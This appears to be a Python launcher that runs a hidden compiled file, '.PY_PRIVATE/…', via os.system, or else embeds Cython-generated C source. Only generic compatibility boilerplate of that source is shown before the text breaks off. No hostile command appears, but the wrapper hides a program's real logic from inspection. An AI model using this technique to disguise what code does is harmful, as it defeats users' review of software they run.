
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250510084538127"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
